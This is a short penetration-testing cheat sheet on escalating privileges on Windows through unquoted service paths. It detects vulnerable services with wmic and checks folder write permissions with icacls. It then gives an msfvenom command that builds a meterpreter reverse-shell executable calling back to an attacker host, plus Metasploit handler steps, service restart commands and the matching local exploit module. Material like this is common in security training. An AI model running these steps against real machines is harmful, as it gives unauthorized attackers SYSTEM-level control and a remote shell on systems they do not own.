# Unquoted Service Paths

## Detection
```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
```

## Example
Imagine service VulnService is affected
```
C:\Program Files\Vuln Service\program.exe # ImagePath value of VulnService
```
If we can put our malicious file in one of these ways, the file will run when the service is restarted.
```
C:\Program
C:\Program Files\Vuln
C:\Program Files\Vuln Service\program.exe
```
* If "C:\Program.exe" is not found, then "C:\Program Files\Vuln.exe" would be executed.<br>
* If "C:\Program Files\Vuln.exe" is not found, finally "C:\Program Files\Vuln Service\program.exe" would be executed.

## Check Permission
Check these folders for write privileges
```
icacls <path>
```
## Generate malicious exe with msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP_ADDRESS LPORT=LOCAL_PORT –f exe > evil.exe
```
Upload the exe file to target machine and then 
```use exploit/multi/handler```
on metasploit. Finally, restart the service

## Service Restart
```
sc stop <service-name>
sc start <service-name>
```

## Exploiting Metasploit
```
exploit/windows/local/trusted_service_path
```
